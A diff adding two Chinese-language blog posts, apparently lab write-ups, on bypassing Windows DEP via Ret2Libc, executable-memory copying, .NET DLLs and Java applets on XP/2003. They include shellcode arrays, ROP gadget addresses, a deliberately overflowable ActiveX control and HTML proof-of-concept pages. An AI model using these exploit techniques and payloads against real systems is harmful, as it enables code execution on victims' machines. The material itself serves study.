@@ -333,6 +333,1203 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/12/攻击DEP的方法-下/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/12/攻击DEP的方法-下/" itemprop="url">攻击DEP的方法(下)——可执行内存、.Net、Java Applet</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-12T10:01:59+08:00">
+                2017-07-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1-利用可执行内存"><a href="#1-利用可执行内存" class="headerlink" title="1. 利用可执行内存"></a>1. 利用可执行内存</h3><h4 id="1-1-实验代码"><a href="#1-1-实验代码" class="headerlink" title="1.1 实验代码"></a>1.1 实验代码</h4><pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90"
+    "\x8A\x17\x84\x7C"            // pop eax retn
+    "\x0B\x1A\xBF\x7C"            // pop pop retn
+    "\xBA\xD9\xBB\x7C"            // 修正EBP
+    "\x5F\x78\xA6\x7C"            // pop retn
+    "\x08\x00\x14\x00"            // 弹出机器码在可执行空间的起始地址，转入执行用
+    "\x00\x00\x14\x00"            // 可执行内存空间地址，复制用
+    "\xBF\x7D\xC9\x77"            // push esp jmp eax && 跳转至(pop pop retn地址)
+    "\xFF\x00\x00\x00"            // shellcode 长度
+    "\xAC\xAF\x94\x7C"            // memcpy入口
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    memcpy(str, shellcode, 450);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+</code></pre>
+
+<h4 id="1-2-实验内容"><a href="#1-2-实验内容" class="headerlink" title="1.2 实验内容"></a>1.2 实验内容</h4><p><b>实验思路</b></p>
+<ol>
+<li>禁用GS和SafeSEH</li>
+<li>test存在溢出</li>
+<li>覆盖返回地址后，通过Ret2Libc技术，利用memcpy函数将shellcode复制到可读可写可执行区域</li>
+<li>最后在这段可执行的内存空间中执行shellcode，实现DEP的绕过</li>
+</ol>
+<p><b>实验环境</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows 2003 SP2</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC 6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>禁用优化选项</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>debug版本</td>
+</tr>
+</tbody>
+</table>
+<p>在OllyDbg中可以看出，在0x00140000的位置，Access和Initial Access都是RWE，这代表这一段是可读可写可执行的内存，长度为0x1000。</p>
+<ol>
+<li>源内存起始地址  <font color="#f00">[ebp+0xC]</font>，用push esp jmp eax指令地址来填充，push esp后这个位置会覆盖为当前esp，以实现源内存起始地址的动态获取</li>
+<li>复制字符串长度：0xFF  <font color="#f00">[ebp+0x10]</font></li>
+<li>目的地址0x00140000  <font color="#f00">[ebp+0x8]</font></li>
+</ol>
+<p>实验中，溢出字符串起始地址0x0012FDB0，返回地址0x0012FE68<br>pop eax retn地址:0x7C84178A<br>pop pop retn地址:0x7CBF1A0B(pop ebx pop edi retn)<br>修正EBP retn 4地址:0x7CBBD9BA(push esp pop ebp retn 4)<br>pop ecx retn地址:0x7CA6785F<br>push esp jmp eax地址:0x77C97DBF(用于跳转)<br>memcpy入口地址:0x7C94AFAC</p>
+<h3 id="2-利用-NET"><a href="#2-利用-NET" class="headerlink" title="2. 利用.NET"></a>2. 利用.NET</h3><p>实验支持:</p>
+<ol>
+<li>具有溢出漏洞的ActiveX控件</li>
+<li>包含shellcode的.NET控件</li>
+<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
+</ol>
+<h4 id="2-1-ActiveX控件"><a href="#2-1-ActiveX控件" class="headerlink" title="2.1 ActiveX控件"></a>2.1 ActiveX控件</h4><p>ActiveX控件</p>
+<pre><code>
+void CVulnerAX_DEPCtrl::test(LPCTSTR str)
+{
+    // AFX_MANAGE_STATE(AfxGetStaticModuleState());
+    // TODO: Add your dispatch handler code here
+    printf("aaaa");
+    char dest[100];
+    sprintf(dest, "%s", str);
+}
+</code></pre>
+
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>优化</td>
+<td><font color="#f00">禁用优化选项</font></td>
+<td></td>
+</tr>
+<tr>
+<td>MFC</td>
+<td>在静态库中使用MFC</td>
+<td>工程属性-&gt;General-&gt;Use of MFC</td>
+</tr>
+<tr>
+<td>字符集</td>
+<td>使用Unicode字符集</td>
+<td>工程属性-&gt;General-&gt;Character Set</td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>release版本</td>
+</tr>
+</tbody>
+</table>
+<p>编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32</p>
+<h4 id="2-2-包含shellcode的-NET控件"><a href="#2-2-包含shellcode的-NET控件" class="headerlink" title="2.2 包含shellcode的.NET控件"></a>2.2 包含shellcode的.NET控件</h4><font color="#f00">在VS2008中C#下边建立一个DLL解决方案</font>
+
+<p><img src="/images/2017-07-12/net.jpg" alt="C#下建立的DLL解决方案"></p>
+<p>包含shellcode的.NET控件代码</p>
+<pre><code>
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+
+namespace DEP_NETDLL
+{
+    public class Class1
+    {
+        public void Shellcode()
+        {
+            string shellcode = 
+                "\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
+                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
+                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
+                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
+                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
+                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
+                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
+                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
+                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
+                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
+                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
+                "\uff53\ufc57\uff53\uf857";
+        }
+    }
+}
+
+</code></pre>
+
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>基址</td>
+<td>0x24240000</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>Debug版本</td>
+<td>Release版本的优化会影响shellcode</td>
+</tr>
+</tbody>
+</table>
+<p>设置DLL的基址方法如下：&quot;Project-&gt;Properties-&gt;Build-&gt;Advanced&quot;<br><img src="/images/2017-07-12/set_dll_address.jpg" alt="设置DLL基址"></p>
+<h4 id="2-3-POC及测试"><a href="#2-3-POC及测试" class="headerlink" title="2.3 POC及测试"></a>2.3 POC及测试</h4><p>编译好DLL之后，需要将DLL和溢出ActiveX控件的POC页面放到同一目录下，并通过如下调试代码调用</p>
+<pre><code>&lt;object classID="DEP_NETDLL.dll#DEP_NETDLL.Shellcode"&gt;&lt;/object&gt;
+</code></pre>
+
+<p>Shellcode设置好后，就来设置POC页面，并将POC页面与.NET控件放到一台WEB服务器上，在实验机上访问这个POC页面，以触发ActiveX中的溢出漏洞，通过.NET控件绕过DEP。</p>
+<p>POC页面如下</p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;object classID=&quot;DEP_NETDLL.dll#DEP_NETDLL.Class1&quot;&gt;&lt;/object&gt;
+&lt;object classid=&quot;clsid:053CC2BD-8E24-4E01-A950-9FF689F40487&quot; id=&quot;test&quot;&gt;&lt;/object&gt;
+&lt;script&gt;
+var s = &quot;\u9090&quot;;
+while(s.length &lt; 54){
+    s += &quot;\u9090&quot;;
+}
+s += &quot;\u24E2\u2424&quot;;
+test.test(s);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><b>实验解释：</b></p>
+<ol>
+<li>为了简单地反映绕过DEP的过程，本实验所攻击的ActiveX控件不启用GS</li>
+<li>通过web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的.NET控件</li>
+<li>ActiveX控件中的test函数存在典型的溢出</li>
+<li>编译.NET控件的时候，我们设置DLL的基址，所以我们将函数的返回地址覆盖为.NET控件中的shellcode起始地址，进而转入shellcode执行</li>
+<li>实验使用Unicode编码，在计算填充长度时要考虑Unicode与Ascii编码之间的长度差问题</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>浏览器</td>
+<td>IE6</td>
+</tr>
+</tbody>
+</table>
+<p>当弹出下面所示对话框时用OllyDbg附加IE的进程，附加好后按一下F9键让程序继续运行。<br><img src="/images/2017-07-12/ie.jpg" alt="对话框"></p>
+<p>然后转到DEP_NETDLL.dll的内存空间中查找shellcode的具体位置，然后进入该内存空间。</p>
+<p>shellcode的起始地址0x242424DF。而我们填充的字符串起始地址0x01EFF534，函数返回地址0x01EFF5A0，所以填充108（0x6C）字节就可以覆盖返回地址。</p>
+<font color="#f00">令人意外的是，我们无法包含dll文件，使用了所有可能的办法，都无法在html中使用dll</font>
+
+<h3 id="3-利用java-applet"><a href="#3-利用java-applet" class="headerlink" title="3. 利用java applet"></a>3. 利用java applet</h3><p>实验支持:</p>
+<ol>
+<li>具有溢出漏洞的ActiveX控件</li>
+<li>包含shellcode的Java Applet控件</li>
+<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
+</ol>
+<h4 id="3-1-ActiveX控件"><a href="#3-1-ActiveX控件" class="headerlink" title="3.1 ActiveX控件"></a>3.1 ActiveX控件</h4><p>上一讲已经介绍</p>
+<h4 id="3-2-包含shellcode的Java-Applet控件"><a href="#3-2-包含shellcode的Java-Applet控件" class="headerlink" title="3.2 包含shellcode的Java Applet控件"></a>3.2 包含shellcode的Java Applet控件</h4><p>实验代码</p>
+<pre><code>
+import java.applet.*;
+import java.awt.*;
+public class Shellcode extends Applet{
+    public void init(){
+        Runtime.getRuntime().gc();
+        StringBuffer buffer = new StringBuffer(255);
+        buffer.append("\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
+                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
+                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
+                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
+                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
+                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
+                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
+                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
+                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
+                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
+                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
+                "\uff53\ufc57\uff53\uf857");
+    }
+}
+</code></pre>
+
+<p>编译成class文件后，在Web中通过如下代码调用<br>    <applet code="class文件名.class"></applet></p>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>Java JDK</td>
+<td>1.4.2</td>
+<td></td>
+</tr>
+<tr>
+<td>目标版本</td>
+<td>1.1</td>
+<td>脱离JRE，在不具有JRE机器上也能执行</td>
+</tr>
+<tr>
+<td>编译指令</td>
+<td>javac 路径\Shellcode.java -target 1.1</td>
+</tr>
+</tbody>
+</table>
+<h4 id="3-3-POC及其利用"><a href="#3-3-POC及其利用" class="headerlink" title="3.3 POC及其利用"></a>3.3 POC及其利用</h4><p>编译产生的Shellcode.class与POC放到同一目录下</p>
+<p>POC页面代码</p>
+<pre><code>
+&lt;html&gt;
+&lt;body&gt;
+&lt;applet code=Shellcode.class width=300 height=50&gt;&lt;/applet&gt;
+&lt;script&gt;alert("开始溢出:");&lt;/script&gt;
+&lt;object classid="clsid:053CC2BD-8E24-4E01-A950-9FF689F40487" id="test"&gt;&lt;/object&gt;
+&lt;script&gt;
+var s = "\u9090";
+while(s.length &lt; 54){
+    s += "\u9090";
+}
+s += "\u04FC\u1001";
+test.test(s);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>代码解释:</p>
+<ol>
+<li>ActiveX不使用GS</li>
+<li>通过Web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的Java applet控件</li>
+<li>java applet的内存空间中具有可执行权限，所以我们的shellcode有执行的机会</li>
+<li>ActiveX控件中的test函数存在典型的溢出</li>
+<li>将函数的返回地址覆盖为Java Applet中的.text段的shellcode起始地址，进而转入shellcoe中执行</li>
+<li>实验用Unicode编码，需要考虑Unicode与Ascii之间的转换</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>JRE状态</td>
+<td>启用</td>
+<td></td>
+</tr>
+<tr>
+<td>Java JDK</td>
+<td>1.4.2</td>
+<td>不要使用高版本的JRE，否则Java applet申请的内存不在IE进程中</td>
+</tr>
+<tr>
+<td>浏览器</td>
+<td>IE6</td>
+</tr>
+</tbody>
+</table>
+<p>在浏览器中启用JRE：Internet选项-&gt;高级-&gt;Java-&gt;将Java……用于&lt;applet&gt;</p>
+<p>当弹出“开始溢出”对话框时用OllyDbg附加IE进程，附加好后用F9继续执行。而shellcode地址可以通过OllyFindAddr插件中的Custom-Search搜索弹出对话框机器码的前4字节&quot;FC686A0A&quot;来定位shellcode</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/09/攻击DEP的方法-上/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/09/攻击DEP的方法-上/" itemprop="url">攻击DEP的方法（上）——Ret2Libc</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-09T18:27:43+08:00">
+                2017-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="利用Ret2Libc挑战DEP"><a href="#利用Ret2Libc挑战DEP" class="headerlink" title="利用Ret2Libc挑战DEP"></a>利用Ret2Libc挑战DEP</h2><p>让代码跳转到已经存在的系统函数中就不会被DEP拦截，Ret2libc攻击就是这个原理。（Return to libc）。简言之，就是shellcode的每条指令都可以在代码区中找到一条替代指令。但是这种方法太繁重，而且不好控制栈帧。<br><img src="/images/2017-07-09/ret2libc.jpg" alt="ret2libc具体流程"></p>
+<p>所以有以下三种方法：</p>
+<ol>
+<li>通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行</li>
+<li>通过跳转到VirtualProtect函数将shellcode所在内存页设置爱为可执行状态，然后在转入shellcode执行</li>
+<li>通过跳转到VirtualAlloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到段内存中执行</li>
+</ol>
+<h3 id="1-Ret2Libc之利用ZwSetInformationProcess"><a href="#1-Ret2Libc之利用ZwSetInformationProcess" class="headerlink" title="1. Ret2Libc之利用ZwSetInformationProcess"></a>1. Ret2Libc之利用ZwSetInformationProcess</h3><h4 id="1-1-ZwSetInformationProcess简介"><a href="#1-1-ZwSetInformationProcess简介" class="headerlink" title="1.1 ZwSetInformationProcess简介"></a>1.1 ZwSetInformationProcess简介</h4><p>API函数ZwQueryInformationProcess和ZwSetInformationProcess进行查询和修改(有些资料中是NtQueryInformationProcess和NtSetInformationProcess)。</p>
+<p>进程的DEP设置标识保存在KPROCESS结构中的_KEXECUTE_OPTIONS上。</p>
+<pre><code>_KEXECUTE_OPTIONS
+Pos0 ExecuteDisable: 1bit
+Pos1 ExecuteEnable: 1bit
+Pos2 DisableThunkEmulation: 1bit
+Pos3 Permanent: 1bit
+Pos4 ExecuteDispatchEnable: 1bit
+Pos5 ImageDispatchEnable: 1bit
+Pos6 Spare: 2bit
+</code></pre>
+
+<p>前4个bit与DEP有关，当前进程DEP开启时ExecuteDisable位为1，当前进程DEP关闭时ExecuteEnable位为1，DisableThunkEmulation是为了兼容ATL程序设置的，Permanent被置为1后表示这些标志位都不能被修改。</p>
+<pre><code>NtSetInformationProcess(
+    IN HANDLE ProcessHandle,
+    IN PROCESS_INFORMATION_CLASS ProcessInformationClass,
+    IN PVOID ProcessInformation,
+    IN ULONG ProcessInformationLength
+);
+</code></pre>
+
+<p>第一个参数为进程句柄，设置为-1表示当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS；第四个参数为第三个参数的长度。于是，最终的参数设置为：</p>
+<pre><code>
+ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
+ZwSetInformationProcess(
+    NtCurrentProcess(),        // (HANDLE)-1
+    ProcessExecuteFlags,    // 0x22
+    &ExecuteFlags,            // ptr to 0x2
+    sizeof(ExecuteFlags)    // 0x4
+);
+</code></pre>
+
+<p>但是问题是函数参数中会包含0x00这样的截断字符。其实解决办法是微软的兼容性考虑：如果一个进程的Permanent位没设置，当它加载DLL时，系统会对这个DLL进行DEP兼容性检查，当存在兼容性问题时进程的DEP就会关闭。为此微软设立了LdrpCheckNXCompatibility函数，当符合下列条件之一进程的DEP就会被关闭：</p>
+<ol>
+<li>当DLL受SafeDisc版权保护系统保护时</li>
+<li>当DLL包含有.aspcak、.pcle、.sforce等字节时</li>
+<li>Windows Vista下面当DLL包含在注册表&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions&quot;键下边标识出不需启动DEP的模块时</li>
+</ol>
+<p>以SafeDisc为例，查看Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程：<br><img src="/images/2017-07-09/safedisc.jpg" alt="具体流程"></p>
+<p>我们可以模拟这个过程，从0x7C93CD24入手关闭DEP，这个地址可通过OllyFindAddr插件中的Disable DEP-&gt;Disable DEP&lt;=XP SP3来搜索<br><img src="/images/2017-07-09/find_addr.jpg" alt="DEP起始地址"><br>由于只有CMP AL,1 成立的情况下程序继续执行，所以需要一个指令将AL修改为1。将AL修改为1后让程序转到0x7C93CD24执行，在执行0x7C93CD6F处的RETN 4时DEP已经关闭，此时如果我们可以在RETN到一个精心构造的指令地址上，就可能转入shellcode中执行。<br><img src="/images/2017-07-09/retn_4.jpg" alt="跳转地址"></p>
+<h4 id="1-2-实验代码"><a href="#1-2-实验代码" class="headerlink" title="1.2 实验代码"></a>1.2 实验代码</h4><pre><code>
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x52\xE2\x92\x7C"        // MOV EAX, 1   RETN地址
+    "\x85\x8B\x1D\x5D"        // 修正EBP
+    "\x19\x4A\x97\x7C"        // 增大ESP
+    "\xB4\xC1\xC5\x7D"        // jmp esp
+    "\x24\xCD\x93\x7C"        // 关闭DEP代码的起始位置
+    "\xE9\x33\xFF\xFF\xFF\x90\x90\x90";    // 回跳指令
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    strcpy(str, shellcode);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+</code></pre>
+
+<h4 id="1-3-Windows-XP-SP3实验内容"><a href="#1-3-Windows-XP-SP3实验内容" class="headerlink" title="1.3  Windows XP SP3实验内容"></a>1.3  Windows XP SP3实验内容</h4><p><b>实验思路：</b></p>
+<ol>
+<li>为了更直观，将不启用GS和SafeSEH</li>
+<li>函数test存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖函数返回地址</li>
+<li>将函数的返回地址覆盖为类似MOV AL,1 retn的指令，在将AL置1后转入0x7C93CD24关闭DEP</li>
+<li>DEP关闭后shellcode就可以正常执行</li>
+</ol>
+<p><b>实验环境</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC 6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>禁用优化选项</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>debug版本</td>
+</tr>
+</tbody>
+</table>
+<font color="#f00">由于不知道如何设置VC6.0的release版本的禁用编译优化选项，所以直接使用了Debug版本！其实查看是否被优化，可以设置int 3断点，查看后续指令是否按照正常顺序执行！</font>
+
+<p>从上面的OllyFindAddr插件中的Disable DEP-&gt;Disable DEP&lt;=XP SP3搜索结果可以看出，step2提供了符合“将AL置1并收回程序控制权”要求的指令。本次使用0x7C92E252。<br>经过测试得到溢出字符串的起始地址:0x0012FDB0<br>test函数的返回地址:0x0012FE64<br>覆盖返回地址:0x7C92E252</p>
+<p>调试发现，收回程序控制权之后，EIP修改为红框表示的值。所以为了让程序转入关闭DEP，需要返回地址后添加4字节0x7C93CD24。<br><img src="/images/2017-07-09/ret_addr.jpg" alt="接受程序控制权"></p>
